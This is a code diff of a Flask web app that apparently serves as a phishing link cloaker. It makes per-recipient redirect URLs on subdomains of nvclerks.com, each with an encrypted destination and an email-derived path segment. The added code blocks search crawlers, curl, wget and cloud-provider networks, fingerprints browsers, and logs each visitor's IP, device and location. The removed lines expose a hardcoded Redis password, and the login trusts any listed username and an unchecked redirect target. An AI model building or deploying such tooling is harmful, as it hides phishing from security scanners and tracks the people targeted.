@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, render_template_string, abort, url_for, session
+from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, Response
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import hashes, hmac
 from cryptography.hazmat.backends import default_backend
@@ -17,24 +17,27 @@ from redis import Redis
 from functools import wraps
 import requests
 import traceback
+from user_agents import parse
+from dotenv import load_dotenv
+import csv
+from io import StringIO
 
 app = Flask(__name__)
+load_dotenv()
 
 # Configure logging
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.StreamHandler()
-    ]
+    handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger(__name__)
 logger.debug("Initializing Flask app")
 
 # Configuration
 try:
-    app.config['SERVER_NAME'] = 'nvclerks.com'
-    app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', secrets.token_hex(32))
+    app.config['SERVER_NAME'] = os.getenv('SERVER_NAME', 'nvclerks.com')
+    app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY', secrets.token_hex(32))
     app.config['SESSION_COOKIE_HTTPONLY'] = True
     app.config['SESSION_COOKIE_SECURE'] = True
     app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
@@ -44,17 +47,20 @@ except Exception as e:
     raise
 
 # Environment variables
-ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", secrets.token_bytes(32))
-HMAC_KEY = os.environ.get("HMAC_KEY", secrets.token_bytes(32))
-REDIS_URL = os.environ.get("REDIS_URL", "redis://:AZSFAAIjcDEwMzUzMTExOTI5NDY0ZTY4OWVmYWE4NzFmZjNkMzcyNXAxMA@kind-ferret-38021.upstash.io:6379")
-MAXMIND_KEY = os.environ.get("MAXMIND_KEY", "")
-BASE_DOMAIN = "nvclerks.com"
+ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", secrets.token_bytes(32))
+HMAC_KEY = os.getenv("HMAC_KEY", secrets.token_bytes(32))
+REDIS_URL = os.getenv("REDIS_URL", "")
+MAXMIND_KEY = os.getenv("MAXMIND_KEY", "")
+USER_TXT_URL = os.getenv("USER_TXT_URL", "https://raw.githubusercontent.com/<repo>/main/user.txt")  # Replace <repo>
+BASE_DOMAIN = os.getenv("BASE_DOMAIN", "nvclerks.com")
+DATA_RETENTION_DAYS = int(os.getenv("DATA_RETENTION_DAYS", 90))
 
 # Log environment variables
 logger.debug(f"ENCRYPTION_KEY: {'set' if ENCRYPTION_KEY else 'not set'}")
 logger.debug(f"HMAC_KEY: {'set' if HMAC_KEY else 'not set'}")
-logger.debug(f"REDIS_URL: {REDIS_URL[:50]}...")
+logger.debug(f"REDIS_URL: {REDIS_URL[:50] if REDIS_URL else 'not set'}...")
 logger.debug(f"MAXMIND_KEY: {'set' if MAXMIND_KEY else 'not set'}")
+logger.debug(f"USER_TXT_URL: {USER_TXT_URL}")
 
 # Redis initialization
 redis_client = None
@@ -66,23 +72,39 @@ except Exception as e:
     logger.error(f"Redis connection failed: {str(e)}", exc_info=True)
     redis_client = None
 
-# Bot detection
-BOT_PATTERNS = [
-    "googlebot", "bingbot", "yandex", "duckduckbot"
-]
+# Bot detection patterns
+BOT_PATTERNS = ["googlebot", "bingbot", "yandex", "duckduckbot", "curl/", "wget/"]
 
-def is_bot(user_agent):
+def is_bot(user_agent, headers):
     try:
         if not user_agent:
             logger.warning("No User-Agent provided")
-            return False
+            return True, "Missing User-Agent"
         user_agent = user_agent.lower()
-        result = any(pattern in user_agent for pattern in BOT_PATTERNS)
-        logger.debug(f"Bot detection result: {result} for User-Agent: {user_agent}")
-        return result
+        # Basic bot patterns
+        for pattern in BOT_PATTERNS:
+            if pattern in user_agent:
+                return True, f"Known bot: {pattern}"
+        # Header analysis
+        if not headers.get('Accept') or not headers.get('Referer'):
+            return True, "Missing browser headers"
+        # Mimicry detection
+        ua = parse(user_agent)
+        if ua.is_mobile and 'X-Desktop' in headers:
+            return True, "Mimicry: Mobile UA with desktop headers"
+        # Rapid request detection
+        if redis_client:
+            ip = request.remote_addr
+            key = f"bot_check:{ip}"
+            count = redis_client.get(key)
+            if count and int(count) > 10:  # More than 10 requests in 60s
+                return True, "Rapid requests"
+            redis_client.incr(key)
+            redis_client.expire(key, 60)
+        return False, "Human"
     except Exception as e:
         logger.error(f"Error in is_bot: {str(e)}", exc_info=True)
-        return False
+        return True, "Error in bot detection"
 
 def check_asn(ip):
     try:
@@ -91,14 +113,29 @@ def check_asn(ip):
             return False
         response = requests.get(f"https://api.maxmind.com/v2.0/asn/{ip}?apiKey={MAXMIND_KEY}")
         response.raise_for_status()
-        asn = response.json().get('asn')
-        blocked_asns = [16509, 14618, 8075, 14061, 16276]
+        asn = response.json().get('asn', 0)
+        blocked_asns = [16509, 14618, 8075, 14061, 16276]  # Example ASNs
         result = asn in blocked_asns
         logger.debug(f"ASN check for IP {ip}: ASN {asn}, Blocked: {result}")
         return result
     except Exception as e:
         logger.error(f"MaxMind ASN check failed: {str(e)}", exc_info=True)
         return False
+
+def get_geoip(ip):
+    try:
+        if not MAXMIND_KEY:
+            return {"country": "Unknown", "city": "Unknown"}
+        response = requests.get(f"https://geoip.maxmind.com/geoip/v2.0/city/{ip}?apiKey={MAXMIND_KEY}")
+        response.raise_for_status()
+        data = response.json()
+        return {
+            "country": data.get('country', {}).get('names', {}).get('en', 'Unknown'),
+            "city": data.get('city', {}).get('names', {}).get('en', 'Unknown')
+        }
+    except Exception as e:
+        logger.error(f"MaxMind GeoIP failed: {str(e)}", exc_info=True)
+        return {"country": "Unknown", "city": "Unknown"}
 
 def rate_limit(limit=10, per=60):
     def decorator(f):
@@ -283,25 +320,219 @@ def decrypt_signed_token(encrypted):
         logger.error(f"Signed Token decryption error: {str(e)}", exc_info=True)
         raise ValueError("Invalid payload")
 
+def get_valid_usernames():
+    try:
+        if redis_client:
+            cached = redis_client.get("usernames")
+            if cached:
+                return json.loads(cached)
+        response = requests.get(USER_TXT_URL)
+        response.raise_for_status()
+        usernames = [line.strip() for line in response.text.splitlines() if line.strip()]
+        if redis_client:
+            redis_client.setex("usernames", 3600, json.dumps(usernames))
+        logger.debug(f"Fetched {len(usernames)} usernames from GitHub")
+        return usernames
+    except Exception as e:
+        logger.error(f"Error fetching user.txt: {str(e)}", exc_info=True)
+        return []
+
+def login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'username' not in session:
+            return redirect(url_for('login', next=request.url))
+        return f(*args, **kwargs)
+    return decorated_function
+
+@app.route("/login", methods=["GET", "POST"])
+@rate_limit(limit=5, per=60)
+def login():
+    try:
+        if request.method == "POST":
+            username = request.form.get("username", "").strip()
+            valid_usernames = get_valid_usernames()
+            if username in valid_usernames:
+                session['username'] = username
+                session.modified = True
+                logger.debug(f"User {username} logged in")
+                next_url = request.form.get('next') or url_for('dashboard')
+                return redirect(next_url)
+            logger.warning(f"Invalid login attempt: {username}")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <meta name="robots" content="noindex, nofollow">
+                    <title>Login</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                    <style>
+                        body { background: #f3f4f6; }
+                        .container { animation: fadeIn 1s ease-in; }
+                        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+                    </style>
+                </head>
+                <body class="min-h-screen flex items-center justify-center p-4">
+                    <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
+                        <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Login</h1>
+                        <p class="text-red-600 mb-4 text-center">Invalid username. Please try again.</p>
+                        <form method="POST" class="space-y-5">
+                            <input type="hidden" name="next" value="{{ request.args.get('next', '') }}">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700">Username</label>
+                                <input type="text" name="username" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            </div>
+                            <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Login</button>
+                        </form>
+                    </div>
+                </body>
+                </html>
+            """)
+        return render_template_string("""
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <meta name="robots" content="noindex, nofollow">
+                <title>Login</title>
+                <script src="https://cdn.tailwindcss.com"></script>
+                <style>
+                    body { background: #f3f4f6; }
+                    .container { animation: fadeIn 1s ease-in; }
+                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+                </style>
+            </head>
+            <body class="min-h-screen flex items-center justify-center p-4">
+                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
+                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Login</h1>
+                    <form method="POST" class="space-y-5">
+                        <input type="hidden" name="next" value="{{ request.args.get('next', '') }}">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700">Username</label>
+                            <input type="text" name="username" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                        </div>
+                        <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Login</button>
+                    </form>
+                </div>
+            </body>
+            </html>
+        """)
+    except Exception as e:
+        logger.error(f"Error in login: {str(e)}", exc_info=True)
+        abort(500, "Internal Server Error")
+
 @app.route("/", methods=["GET"])
 @rate_limit(limit=5, per=60)
 def index():
     try:
-        user_agent = request.headers.get("User-Agent", "")
-        ip = request.remote_addr
-        logger.debug(f"Index accessed, IP: {ip}, User-Agent: {user_agent}")
-        if is_bot(user_agent) or check_asn(ip):
-            logger.warning("Bot or suspicious ASN detected")
-            abort(403, "Access denied")
+        if 'username' in session:
+            return redirect(url_for('dashboard'))
+        return redirect(url_for('login'))
+    except Exception as e:
+        logger.error(f"Error in index: {str(e)}", exc_info=True)
+        abort(500, "Internal Server Error")
 
-        # Set js_verified to True initially to bypass Access Denied
-        session['js_verified'] = True
-        session.modified = True
+@app.route("/dashboard", methods=["GET", "POST"])
+@login_required
+@rate_limit(limit=5, per=60)
+def dashboard():
+    try:
+        username = session['username']
+        error = None
+        if request.method == "POST":
+            subdomain = request.form.get("subdomain", "default")
+            randomstring1 = request.form.get("randomstring1", "default")
+            base64email = request.form.get("base64email", "default")
+            destination_link = request.form.get("destination_link", "https://example.com")
+            randomstring2 = request.form.get("randomstring2", generate_random_string(8))
+            expiry = int(request.form.get("expiry", 86400))
+
+            # Validate inputs
+            if not re.match(r"^https?://", destination_link):
+                error = "Invalid URL"
+            elif not (2 <= len(subdomain) <= 100 and re.match(r"^[A-Za-z0-9\-]{2,100}$", subdomain)):
+                error = "Subdomain must be 2-100 characters (letters, numbers, or hyphens)"
+            elif not (2 <= len(randomstring1) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", randomstring1)):
+                error = "Randomstring1 must be 2-100 characters (letters, numbers, _, @, .)"
+            elif not (2 <= len(randomstring2) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", randomstring2)):
+                error = "Randomstring2 must be 2-100 characters (letters, numbers, _, @, .)"
+            elif not (2 <= len(base64email) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", base64email)):
+                error = "Base64email must be 2-100 characters (letters, numbers, _, @, .)"
+
+            if not error:
+                base64_email = base64email
+                path_segment = f"{randomstring1}{base64_email}{randomstring2}"
+                endpoint = generate_random_string(8)
+                encryption_methods = ['heap_x3', 'slugstorm', 'pow', 'signed_token']
+                method = secrets.choice(encryption_methods)
+                fingerprint = generate_fingerprint()
+                expiry_timestamp = int(time.time()) + expiry
+                payload = json.dumps({
+                    "student_link": destination_link,
+                    "timestamp": int(time.time() * 1000),
+                    "randomstring1": randomstring1,
+                    "randomstring2": randomstring2,
+                    "expiry": expiry_timestamp
+                })
+
+                try:
+                    if method == 'heap_x3':
+                        encrypted_payload = encrypt_heap_x3(payload, fingerprint)
+                    elif method == 'slugstorm':
+                        encrypted_payload = encrypt_slugstorm(payload)
+                    elif method == 'pow':
+                        encrypted_payload = encrypt_pow(payload)
+                    else:
+                        encrypted_payload = encrypt_signed_token(payload)
+                except Exception as e:
+                    logger.error(f"Encryption failed with {method}: {str(e)}", exc_info=True)
+                    error = "Failed to encrypt payload"
+
+                if not error:
+                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
+                    url_id = hashlib.sha256(generated_url.encode()).hexdigest()
+                    if redis_client:
+                        redis_client.hset(f"user:{username}:url:{url_id}", mapping={
+                            "url": generated_url,
+                            "destination": destination_link,
+                            "path_segment": path_segment,
+                            "created": int(time.time()),
+                            "expiry": expiry_timestamp,
+                            "clicks": 0
+                        })
+                        redis_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
+                    logger.info(f"Generated URL for {username}: {generated_url}")
+                    return redirect(url_for('dashboard'))
+
+        # Fetch URL history
+        urls = []
+        if redis_client:
+            url_keys = redis_client.keys(f"user:{username}:url:*")
+            for key in url_keys:
+                url_data = redis_client.hgetall(key)
+                url_id = key.split(':')[-1]
+                visits = redis_client.lrange(f"user:{username}:url:{url_id}:visits", 0, -1)
+                visit_data = [json.loads(v) for v in visits]
+                click_trends = {}
+                for visit in visit_data:
+                    date = datetime.fromtimestamp(visit['timestamp']).strftime('%Y-%m-%d')
+                    click_trends[date] = click_trends.get(date, 0) + 1
+                urls.append({
+                    "url": url_data.get('url', ''),
+                    "destination": url_data.get('destination', ''),
+                    "path_segment": url_data.get('path_segment', ''),
+                    "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S'),
+                    "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S'),
+                    "clicks": int(url_data.get('clicks', 0)),
+                    "visits": visit_data,
+                    "click_trends": click_trends
+                })
 
         theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
         primary_color = f"#{theme_seed}"
-        secondary_color = f"#{hashlib.sha256(theme_seed.encode()).hexdigest()[6:12]}"
-        logger.debug(f"Generated theme colors: {primary_color}, {secondary_color}")
 
         return render_template_string("""
             <!DOCTYPE html>
@@ -310,9 +541,34 @@ def index():
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <meta name="robots" content="noindex, nofollow">
-                <title>Secure URL Generator</title>
+                <title>Dashboard - {{ username }}</title>
                 <script src="https://cdn.tailwindcss.com"></script>
+                <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+                <style>
+                    body { background: #f3f4f6; color: #1f2937; }
+                    .container { animation: fadeIn 1s ease-in; }
+                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+                    .card { transition: all 0.3s; }
+                    .card:hover { transform: scale(1.02); }
+                    canvas { max-height: 200px; }
+                </style>
                 <script>
+                    function toggleAnalytics(id) {
+                        document.getElementById('analytics-' + id).classList.toggle('hidden');
+                    }
+                    function applyFilters(id) {
+                        let device = document.getElementById('filter-device-' + id).value;
+                        let type = document.getElementById('filter-type-' + id).value;
+                        let rows = document.querySelectorAll('#visits-' + id + ' tr');
+                        rows.forEach(row => {
+                            let deviceCell = row.cells[2].textContent;
+                            let typeCell = row.cells[4].textContent;
+                            row.style.display = (
+                                (device === '' || deviceCell.includes(device)) &&
+                                (type === '' || typeCell.includes(type))
+                            ) ? '' : 'none';
+                        });
+                    }
                     let challenge = 0;
                     for (let i = 0; i < 1000; i++) challenge += Math.random();
                     fetch('/challenge', {
@@ -322,7 +578,6 @@ def index():
                     }).then(response => {
                         if (!response.ok) window.location = '/denied';
                     });
-
                     function getCanvasFingerprint() {
                         const canvas = document.createElement('canvas');
                         const ctx = canvas.getContext('2d');
@@ -337,47 +592,178 @@ def index():
                         body: JSON.stringify({ fingerprint: getCanvasFingerprint() })
                     });
                 </script>
-                <style>
-                    body { background: linear-gradient(135deg, {{ primary_color }}, {{ secondary_color }}); }
-                    .container { animation: fadeIn 1s ease-in; }
-                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-                    input:focus { box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.3); }
-                    button:hover { transform: scale(1.05); }
-                </style>
             </head>
-            <body class="min-h-screen flex items-center justify-center p-4">
-                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
-                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Secure URL Generator</h1>
-                    <form method="POST" action="{{ url_for('generate') }}" class="space-y-5">
-                        <div>
-                            <label class="block text-sm font-medium text-gray-700">Subdomain</label>
-                            <input type="text" name="subdomain" required minlength="2" maxlength="100" pattern="[A-Za-z0-9\-]{2,100}" title="Subdomain must be 2-100 characters (letters, numbers, or hyphens)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
-                            <input type="text" name="randomstring1" required minlength="2" maxlength="100" pattern="[A-Za-z0-9]{2,100}" title="Randomstring1 must be 2-100 characters (letters or numbers)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-medium text-gray-700">Base64emailInput</label>
-                            <input type="text" name="base64email" required minlength="2" maxlength="100" pattern="[A-Za-z0-9]{2,100}" title="Base64email must be 2-100 characters (letters or numbers)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-medium text-gray-700">Destination Link</label>
-                            <input type="url" name="destination_link" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
-                            <input type="text" name="randomstring2" required minlength="2" maxlength="100" pattern="[A-Za-z0-9]{2,100}" title="Randomstring2 must be 2-100 characters (letters or numbers)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
-                        </div>
-                        <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Generate URL</button>
-                    </form>
+            <body class="min-h-screen p-4">
+                <div class="container max-w-7xl mx-auto">
+                    <h1 class="text-4xl font-extrabold mb-8 text-center text-gray-900">Welcome, {{ username }}</h1>
+                    {% if error %}
+                        <p class="text-red-600 mb-4 text-center">{{ error }}</p>
+                    {% endif %}
+                    <div class="bg-white p-8 rounded-xl shadow-2xl mb-8">
+                        <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
+                        <form method="POST" class="space-y-5">
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700">Subdomain</label>
+                                <input type="text" name="subdomain" required minlength="2" maxlength="100" pattern="[A-Za-z0-9\-]{2,100}" title="Subdomain must be 2-100 characters (letters, numbers, or hyphens)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
+                                <input type="text" name="randomstring1" required minlength="2" maxlength="100" pattern="[A-Za-z0-9_@.]{2,100}" title="Randomstring1 must be 2-100 characters (letters, numbers, _, @, .)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700">Base64emailInput</label>
+                                <input type="text" name="base64email" required minlength="2" maxlength="100" pattern="[A-Za-z0-9_@.]{2,100}" title="Base64email must be 2-100 characters (letters, numbers, _, @, .)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700">Destination Link</label>
+                                <input type="url" name="destination_link" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
+                                <input type="text" name="randomstring2" required minlength="2" maxlength="100" pattern="[A-Za-z0-9_@.]{2,100}" title="Randomstring2 must be 2-100 characters (letters, numbers, _, @, .)" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            </div>
+                            <div>
+                                <label class="block text-sm font-medium text-gray-700">Expiry</label>
+                                <select name="expiry" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                                    <option value="3600">1 Hour</option>
+                                    <option value="86400" selected>1 Day</option>
+                                    <option value="604800">1 Week</option>
+                                    <option value="2592000">1 Month</option>
+                                </select>
+                            </div>
+                            <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Generate URL</button>
+                        </form>
+                    </div>
+                    <div class="bg-white p-8 rounded-xl shadow-2xl">
+                        <h2 class="text-2xl font-bold mb-6 text-gray-900">URL History</h2>
+                        {% if urls %}
+                            {% for url in urls %}
+                                <div class="card bg-gray-50 p-6 rounded-lg mb-4">
+                                    <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
+                                    <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600">{{ url.url }}</a></p>
+                                    <p class="text-gray-600"><strong>Path Segment:</strong> {{ url.path_segment }}</p>
+                                    <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
+                                    <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
+                                    <p class="text-gray-600"><strong>Clicks:</strong> {{ url.clicks }}</p>
+                                    <button onclick="toggleAnalytics('{{ loop.index }}')" class="mt-2 bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700">Toggle Analytics</button>
+                                    <div id="analytics-{{ loop.index }}" class="hidden mt-4">
+                                        <h4 class="text-lg font-semibold text-gray-900">Visitor Analytics</h4>
+                                        <canvas id="chart-{{ loop.index }}" class="mt-4"></canvas>
+                                        <script>
+                                            new Chart(document.getElementById('chart-{{ loop.index }}'), {
+                                                type: 'line',
+                                                data: {
+                                                    labels: {{ url.click_trends.keys()|tojson }},
+                                                    datasets: [{
+                                                        label: 'Clicks',
+                                                        data: {{ url.click_trends.values()|tojson }},
+                                                        borderColor: '{{ primary_color }}',
+                                                        fill: false
+                                                    }]
+                                                },
+                                                options: {
+                                                    scales: {
+                                                        x: { title: { display: true, text: 'Date' } },
+                                                        y: { title: { display: true, text: 'Clicks' }, beginAtZero: true }
+                                                    }
+                                                }
+                                            });
+                                        </script>
+                                        <div class="mt-4">
+                                            <label class="block text-sm font-medium text-gray-700">Filter by Device</label>
+                                            <select id="filter-device-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg">
+                                                <option value="">All</option>
+                                                <option value="Android">Android</option>
+                                                <option value="iPhone">iPhone</option>
+                                                <option value="Desktop">Desktop</option>
+                                            </select>
+                                        </div>
+                                        <div class="mt-4">
+                                            <label class="block text-sm font-medium text-gray-700">Filter by Type</label>
+                                            <select id="filter-type-{{ loop.index }}" onchange="applyFilters('{{ loop.index }}')" class="mt-1 w-full p-3 border rounded-lg">
+                                                <option value="">All</option>
+                                                <option value="Human">Human</option>
+                                                <option value="Bot">Bot</option>
+                                                <option value="Mimicry">Mimicry</option>
+                                                <option value="App">App</option>
+                                            </select>
+                                        </div>
+                                        <a href="/export/{{ loop.index }}" class="mt-4 inline-block bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700">Export as CSV</a>
+                                        <table id="visits-{{ loop.index }}" class="mt-4 w-full text-left border-collapse">
+                                            <thead>
+                                                <tr class="bg-gray-200">
+                                                    <th class="p-2">Timestamp</th>
+                                                    <th class="p-2">IP</th>
+                                                    <th class="p-2">Device</th>
+                                                    <th class="p-2">App</th>
+                                                    <th class="p-2">Type</th>
+                                                    <th class="p-2">Location</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody>
+                                                {% for visit in url.visits %}
+                                                    <tr class="{% if visit.type != 'Human' %}bg-red-100{% endif %}">
+                                                        <td class="p-2">{{ visit.timestamp|datetime }}</td>
+                                                        <td class="p-2">{{ visit.ip }}</td>
+                                                        <td class="p-2">{{ visit.device }}</td>
+                                                        <td class="p-2">{{ visit.app }}</td>
+                                                        <td class="p-2">{{ visit.type }}</td>
+                                                        <td class="p-2">{{ visit.location.country }}, {{ visit.location.city }}</td>
+                                                    </tr>
+                                                {% endfor %}
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                            {% endfor %}
+                        {% else %}
+                            <p class="text-gray-600">No URLs generated yet.</p>
+                        {% endif %}
+                    </div>
                 </div>
             </body>
             </html>
-        """, primary_color=primary_color, secondary_color=secondary_color)
+        """, username=username, urls=urls, primary_color=primary_color, error=error)
     except Exception as e:
-        logger.error(f"Internal Server Error in index: {str(e)}", exc_info=True)
-        raise
+        logger.error(f"Error in dashboard: {str(e)}", exc_info=True)
+        abort(500, "Internal Server Error")
+
+@app.route("/export/<int:index>", methods=["GET"])
+@login_required
+def export(index):
+    try:
+        username = session['username']
+        if redis_client:
+            url_keys = redis_client.keys(f"user:{username}:url:*")
+            if index <= 0 or index > len(url_keys):
+                abort(404, "URL not found")
+            key = url_keys[index-1]
+            url_id = key.split(':')[-1]
+            visits = redis_client.lrange(f"user:{username}:url:{url_id}:visits", 0, -1)
+            visit_data = [json.loads(v) for v in visits]
+            output = StringIO()
+            writer = csv.writer(output)
+            writer.writerow(['Timestamp', 'IP', 'Device', 'App', 'Type', 'Country', 'City'])
+            for visit in visit_data:
+                writer.writerow([
+                    datetime.fromtimestamp(visit['timestamp']).strftime('%Y-%m-%d %H:%M:%S'),
+                    visit['ip'],
+                    visit['device'],
+                    visit['app'],
+                    visit['type'],
+                    visit['location']['country'],
+                    visit['location']['city']
+                ])
+            output.seek(0)
+            return Response(
+                output.getvalue(),
+                mimetype='text/csv',
+                headers={"Content-Disposition": f"attachment;filename=visits_{url_id}.csv"}
+            )
+        abort(500, "Redis unavailable")
+    except Exception as e:
+        logger.error(f"Error in export: {str(e)}", exc_info=True)
+        abort(500, "Internal Server Error")
 
 @app.route("/challenge", methods=["POST"])
 def challenge():
@@ -408,122 +794,51 @@ def fingerprint():
         logger.error(f"Error in fingerprint: {str(e)}", exc_info=True)
         return {"status": "error"}, 500
 
-@app.route("/generate", methods=["POST"])
-@rate_limit(limit=3, per=300)
-def generate():
-    try:
-        user_agent = request.headers.get("User-Agent", "")
-        ip = request.remote_addr
-        logger.debug(f"Generate accessed, IP: {ip}, User-Agent: {user_agent}")
-
-        # Relaxed access checks to prevent Access Denied
-        if is_bot(user_agent) or check_asn(ip):
-            logger.warning("Bot or suspicious ASN detected")
-            abort(403, "Access denied")
-
-        subdomain = request.form.get("subdomain", "default")
-        randomstring1 = request.form.get("randomstring1", "default")
-        base64email = request.form.get("base64email", "default")
-        destination_link = request.form.get("destination_link", "https://example.com")
-        randomstring2 = request.form.get("randomstring2", generate_random_string(8))
-
-        # Validate inputs
-        if not re.match(r"^https?://", destination_link):
-            logger.error(f"Invalid URL: {destination_link}")
-            abort(400, "Invalid URL")
-        
-        # Validate length and pattern
-        if not (2 <= len(subdomain) <= 100 and re.match(r"^[A-Za-z0-9\-]{2,100}$", subdomain)):
-            logger.error(f"Invalid subdomain: {subdomain}")
-            abort(400, "Subdomain must be 2-100 characters (letters, numbers, or hyphens)")
-        if not (2 <= len(randomstring1) <= 100 and re.match(r"^[A-Za-z0-9]{2,100}$", randomstring1)):
-            logger.error(f"Invalid randomstring1: {randomstring1}")
-            abort(400, "Randomstring1 must be 2-100 characters (letters or numbers)")
-        if not (2 <= len(randomstring2) <= 100 and re.match(r"^[A-Za-z0-9]{2,100}$", randomstring2)):
-            logger.error(f"Invalid randomstring2: {randomstring2}")
-            abort(400, "Randomstring2 must be 2-100 characters (letters or numbers)")
-        if not (2 <= len(base64email) <= 100 and re.match(r"^[A-Za-z0-9]{2,100}$", base64email)):
-            logger.error(f"Invalid base64email: {base64email}")
-            abort(400, "Base64email must be 2-100 characters (letters or numbers)")
-
-        # Use full inputs for path_segment (case-sensitive, no truncation)
-        base64_email = base64email  # Use as-is without encoding
-        path_segment = f"{randomstring1}{base64_email}{randomstring2}"
-
-        endpoint = generate_random_string(8)
-        encryption_methods = ['heap_x3', 'slugstorm', 'pow', 'signed_token']
-        method = secrets.choice(encryption_methods)
-        fingerprint = generate_fingerprint()
-        payload = json.dumps({
-            "student_link": destination_link,
-            "timestamp": int(time.time() * 1000),
-            "randomstring1": randomstring1,
-            "randomstring2": randomstring2
-        })
-
-        logger.debug(f"Selected encryption method: {method}")
-        try:
-            if method == 'heap_x3':
-                encrypted_payload = encrypt_heap_x3(payload, fingerprint)
-            elif method == 'slugstorm':
-                encrypted_payload = encrypt_slugstorm(payload)
-            elif method == 'pow':
-                encrypted_payload = encrypt_pow(payload)
-            else:
-                encrypted_payload = encrypt_signed_token(payload)
-        except Exception as e:
-            logger.error(f"Encryption failed with {method}: {str(e)}", exc_info=True)
-            abort(500, "Failed to encrypt payload")
-        
-        generated_url = f"https://{urllib.parse.quote(subdomain)}.{BASE_DOMAIN}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}"
-        logger.info(f"Generated URL with {method}: {generated_url}")
-
